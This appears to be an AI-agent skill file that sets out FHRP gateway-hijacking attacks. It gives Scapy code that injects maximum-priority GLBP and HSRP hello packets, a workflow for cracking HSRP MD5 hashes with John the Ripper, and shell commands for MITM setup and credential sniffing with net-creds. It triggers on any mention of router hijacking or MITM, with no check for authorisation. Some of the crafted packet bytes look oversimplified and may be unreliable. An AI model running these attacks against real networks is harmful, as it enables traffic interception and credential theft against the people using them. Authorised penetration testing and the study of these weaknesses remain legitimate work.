---
name: fhrp-attack
description: Execute FHRP (First Hop Redundancy Protocol) attacks including GLBP and HSRP hijacking for network penetration testing. Use this skill whenever the user mentions GLBP, HSRP, FHRP, gateway redundancy protocols, router hijacking, network MITM attacks, or wants to intercept traffic through virtual gateway takeover. This skill provides attack methodologies, packet crafting, and network configuration for both authenticated and unauthenticated scenarios.
---

# FHRP Attack Skill

Execute First Hop Redundancy Protocol attacks against GLBP and HSRP to achieve gateway hijacking and MITM positioning.

## When to Use This Skill

Use this skill when:
- Targeting Cisco network infrastructure with GLBP or HSRP
- Performing network penetration testing on gateway redundancy protocols
- Needing to intercept traffic through virtual gateway takeover
- Testing FHRP security configurations
- Analyzing network traffic for FHRP protocol weaknesses

## Protocol Overview

### GLBP (Gateway Load Balancing Protocol)
- **Multicast**: 224.0.0.102 (IPv4), FF02::66 (IPv6)
- **Port**: UDP 3222
- **Hello Interval**: 3 seconds (default)
- **Hold Time**: 10 seconds (default)
- **Virtual MAC Format**: `0007.b4xx.xxyy`

### HSRP (Hot Standby Router Protocol)
- **HSRPv1**: Multicast 224.0.0.2, MAC `0000.0c07.acXX`
- **HSRPv2**: Multicast 224.0.0.102, MAC `0000.0c9f.fXXX`
- **Port**: UDP 1985 (IPv4), 2029 (IPv6)
- **Hello Interval**: 3 seconds (default)
- **Hold Time**: 10 seconds (default)

## Attack Methodology

### Phase 1: Reconnaissance

1. **Enable promiscuous mode** on the target interface
2. **Capture FHRP traffic** to identify virtual IPs, priorities, and authentication
3. **Analyze captured packets** for protocol version and security configuration

Use the reconnaissance script:
```bash
./scripts/fhrp-recon.sh <interface> <output.pcap>
```

### Phase 2: GLBP Hijacking

#### Unauthenticated Attack

When GLBP authentication is not configured, inject packets with maximum priority (255) to become the Active Virtual Gateway (AVG).

**Quick Scapy approach:**
```python
from scapy.all import *

# Target virtual IP (learned from sniffing)
vip = "10.10.100.254"

# Craft GLBP hello packet with max priority
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
    b"\x01\x00\xff\x64"  # Version=1, Opcode=Hello, Priority=255, Weight=100
)

# Loop to maintain AVG position
send(pkt, iface="eth0", loop=1, inter=1)
```

**Use the GLBP attack script:**
```bash
./scripts/glbp-attack.sh <interface> <virtual-ip> <priority>
```

#### Load Balancing Considerations

GLBP uses multiple load balancing methods:
- **Round-Robin** (default): Alternates AVF MAC assignment
- **Host-Dependent**: Consistent AVF MAC per host (stable for NAT)
- **Weighted Round-Robin**: Based on weight metrics

### Phase 3: HSRP Hijacking

#### Unauthenticated Attack

Inject HSRP hello packets with priority 255 to force Active Router role.

**Quick Scapy approach:**
```python
from scapy.all import *

vip = "10.10.100.1"

# HSRPv2 hello with max priority
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
    b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)

send(pkt, iface="eth0", inter=1, loop=1)
```

**Use the HSRP attack script:**
```bash
./scripts/hsrp-attack.sh <interface> <virtual-ip> <group> <priority>
```

#### Authenticated Attack (MD5)

When MD5 authentication is configured:

1. **Capture HSRP traffic** containing MD5 hashes
2. **Extract hashes** using hsrp2john.py
3. **Crack passwords** with John the Ripper
4. **Inject authenticated packets** with cracked credentials

**Hash extraction workflow:**
```bash
# Capture traffic
tcpdump -w hsrp_traffic.pcap -i eth0

# Extract MD5 hashes
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt hsrp_hashes
```

### Phase 4: MITM Configuration

After hijacking the gateway role, configure your system for traffic interception:

**Use the MITM setup script:**
```bash
./scripts/mitm-setup.sh <interface> <virtual-ip> <gateway-ip>
```

This script:
1. Enables IP forwarding
2. Configures secondary IP on the interface
3. Sets up SNAT/MASQUERADE for traffic visibility
4. Adjusts routing to maintain connectivity

**Manual configuration:**
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0

# Set up NAT for traffic visibility
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing (replace with actual gateway)
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```

### Phase 5: Traffic Interception

Capture credentials and sensitive data from intercepted traffic:

```bash
# Using net-creds.py
sudo python2 net-creds.py -i eth0

# Or tcpdump for raw capture
sudo tcpdump -i eth0 -w captured_traffic.pcap
```

## Authentication Bypass Techniques

### HSRP Authentication Weaknesses

- **Plain-text auth**: Trivially spoofable
- **MD5 authentication**: Only covers payload; crafted packets can still DoS control planes
- **NX-OS vulnerability**: CVE-2014-3295 allowed DoS against authenticated groups
- **Shared VLANs**: HSRPv1 multicasts often visible to tenants without auth

### GLBP Authentication

GLBP authentication is less commonly configured. When absent, priority-based attacks succeed reliably.

## IPv6 Considerations

Both protocols support IPv6:
- **GLBPv6**: Multicast FF02::66, UDP/3222, MAC `0007.b4xx.xxyy`
- **HSRPv2 IPv6**: Multicast FF02::66, UDP/2029, MAC `0000.0c9f.fXXX`

Attack techniques remain the same in dual-stack networks.

## Cleanup

After testing, restore network configuration:

```bash
# Remove secondary IP
sudo ifconfig eth0:1 down

# Remove NAT rules
sudo iptables -t nat -F POSTROUTING

# Restore default route
sudo route add default gw <original-gateway>

# Disable promiscuous mode
sudo ip link set eth0 promisc off
```

## References

- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Medium: Cisco Nightmare - Pentesting Cisco Networks](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Reddit: HSRP on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)

## Scripts

Available scripts in `scripts/`:
- `fhrp-recon.sh` - Capture and analyze FHRP traffic
- `glbp-attack.sh` - Execute GLBP hijacking attack
- `hsrp-attack.sh` - Execute HSRP hijacking attack
- `mitm-setup.sh` - Configure MITM positioning
- `hsrp-hash-extract.py` - Extract MD5 hashes from HSRP captures
